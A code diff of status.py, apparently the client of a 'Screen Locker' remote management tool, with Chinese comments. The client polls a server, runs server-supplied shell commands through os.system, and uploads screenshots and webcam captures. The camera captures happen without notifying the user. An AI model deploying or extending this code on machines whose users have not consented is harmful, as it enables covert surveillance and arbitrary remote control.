v1.1.2

+++ status.py
@@ -5,6 +5,9 @@ import os
 import psutil
 from PIL import ImageGrab
 from cv2 import VideoCapture, imwrite, Laplacian, CV_64F
+from plyer import notification
+
+executed_commands = []
 
 
 def check_process_exists(process_name):
@@ -23,8 +26,12 @@ def upload_screenshot(addr):
         requests.post(
             '[your_url]/upload_screenshot.php', files=files, data=data)
         os.remove("C:/screenlock/screenshot.png")
-    except:
-        pass
+    except Exception as err:
+        try:
+            data = {"addr": addr, "message": str(err)}
+            requests.post("[your_url]/error_report.php", data=data)
+        except:
+            pass
 
 
 def upload_camera(addr):
@@ -33,7 +40,6 @@ def upload_camera(addr):
         cap = VideoCapture(0)
         # 检查相机是否成功打开
         if not cap.isOpened():
-            print("无法打开相机。")
             return
         # 延迟一段时间等待相机稳定
         time.sleep(1)
@@ -42,12 +48,13 @@ def upload_camera(addr):
         best_focus = 0
         # 捕获多帧图像并选择最清晰的一帧
         ret, frame = cap.read()
-        for _ in range(5):
+        for _ in range(10):
             ret, frame = cap.read()
             if ret:
                 # 计算图像清晰度
                 focus = Laplacian(frame, CV_64F).var()
                 # 如果当前图像更清晰，则更新最佳图像和最佳清晰度
+                print(focus, best_focus)
                 if focus > best_focus:
                     best_focus = focus
                     best_frame = frame
@@ -56,13 +63,15 @@ def upload_camera(addr):
         if best_frame is not None:
             # 保存最佳图像到文件
             imwrite("C:\\screenlock\\camera.png", best_frame)
-            print("成功拍摄图片。")
         else:
             imwrite("C:\\screenlock\\camera.png", frame)
-            print("未能捕获到清晰的图像。")
         cap.release()
-    except:
-        pass
+    except Exception as err:
+        try:
+            data = {"addr": addr, "message": str(err)}
+            requests.post("[your_url]/error_report.php", data=data)
+        except:
+            pass
 
     try:
         data = {"addr": addr}
@@ -70,8 +79,12 @@ def upload_camera(addr):
         requests.post(
             '[your_url]/upload_camera.php', files=files, data=data)
         os.remove("C:\\screenlock\\camera.png")
-    except:
-        pass
+    except Exception as err:
+        try:
+            data = {"addr": addr, "message": str(err)}
+            requests.post("[your_url]/error_report.php", data=data)
+        except:
+            pass
 
 
 if __name__ == "__main__":
@@ -81,9 +94,12 @@ if __name__ == "__main__":
         f.close()
     except:
         addr = "获取失败"
-
+    if check_process_exists("screenlock.exe"):
+        is_locked = "lock"
+    else:
+        is_locked = "unlock"
     api_url = "[your_url]/sync.php?addr={0}&is_locked={1}".format(
-        addr, "lock" if check_process_exists("screenlock.exe") else "unlock")
+        addr, is_locked)
 
     while True:
         try:
@@ -92,43 +108,53 @@ if __name__ == "__main__":
                 data = response.json()
                 status = data["status"]
                 status_set_time = float(data["status_set_time"])
+                status_set_user = data["status_set_user"]
                 command = data["command"]
                 command_set_time = float(data["command_set_time"])
                 show_screen_set_time = float(data["show_screen_set_time"])
                 show_camera_set_time = float(data["show_camera_set_time"])
-                print("收到指令：", status)
-                print(status_set_time, command_set_time, show_screen_set_time, show_camera_set_time)
+
                 current_time = time.time()
 
-                if current_time - status_set_time < 7:
-                    print("执行指令：", status)
-                    if status == "unlock":
+                if current_time - status_set_time < 5:
+                    if status == "unlock" and status_set_time not in executed_commands:
                         try:
                             os.system("taskkill /f /im screenlock.exe")
                             subprocess.Popen("C:/Windows/explorer.exe")
-                            time.sleep(10)
-                        except:
-                            pass
-                    else:
-                        print("执行锁屏指令")
+                            executed_commands.append(status_set_time)
+                            notification.notify(app_icon="C:/screenlock/mfles.ico", app_name="Screen Locker", title="远程解锁成功",
+                                                message="管理员远程解锁了此设备。\n操作人：{0}".format(status_set_user), timeout=10)
+                        except Exception as err:
+                            try:
+                                data = {"addr": addr, "message": str(err)}
+                                requests.post(
+                                    "[your_url]/error_report.php", data=data)
+                            except:
+                                pass
+                    elif status_set_time not in executed_commands:
+                        executed_commands.append(status_set_time)
                         if not check_process_exists("screenlock.exe"):
                             subprocess.Popen("C:/screenlock/screenlock.exe")
 
-                if current_time - command_set_time < 7:
+                if current_time - command_set_time < 5 and command_set_time not in executed_commands:
                     command = data["command"]
+                    executed_commands.append(command_set_time)
                     if command is not None:
                         # 执行 command 的命令
                         os.system(command)
-                        time.sleep(5)
 
-                if current_time - show_screen_set_time < 7:
-                    print("执行截图指令")
+                if current_time - show_screen_set_time < 5 and show_screen_set_time not in executed_commands:
                     upload_screenshot(addr=addr)
+                    executed_commands.append(show_screen_set_time)
 
-                if current_time - show_camera_set_time < 7:
-                    print("执行摄像头指令")
+                if current_time - show_camera_set_time < 5 and show_camera_set_time not in executed_commands:
                     upload_camera(addr=addr)
-
-        except:
-            pass
-        time.sleep(4)
+                    executed_commands.append(show_camera_set_time)
+        except Exception as err:
+            try:
+                data = {"addr": addr, "message": str(err)}
+                requests.post(
+                    "[your_url]/error_report.php", data=data)
+            except:
+                pass
+        time.sleep(2)
